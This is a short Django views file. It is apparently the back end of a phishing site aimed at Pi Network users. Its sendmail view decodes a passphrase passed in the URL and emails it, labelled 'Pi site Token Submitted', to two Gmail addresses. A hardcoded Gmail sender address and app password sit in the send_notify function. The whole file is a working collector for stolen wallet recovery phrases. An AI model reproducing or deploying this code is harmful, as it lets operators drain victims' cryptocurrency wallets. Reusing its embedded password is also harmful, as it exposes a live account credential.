from django.shortcuts import render
from firebmail import sendmail as sending_no
from datetime import datetime
from django.http import HttpResponse
from urllib.parse import unquote

# Create your views here.


def send_notify(subject, payload, email_to):
    sender = "ezekielizuchi2018@gmail.com"
    password = "pvos glgf nxal finc"
    recipient = email_to
    
    return sending_no(payload, recipient, sender,password, subject)

def sendmail(request, keys):
    current_date = datetime.now()
    formatted_time = current_date.strftime("%Y-%m-%d %H:%M:%S")
    
    decoded_param = unquote(keys)
    send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the passphrase is -( {decoded_param} )', subject=f'Pi site Token Submitted {formatted_time}', email_to="ezekielobiajulu0@gmail.com")
                    
    send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the passphrase is -( {decoded_param} )', subject=f'Pi site Token Submitted {formatted_time}', email_to="obikeechiemerielinus@gmail.com")
    
    return HttpResponse('done')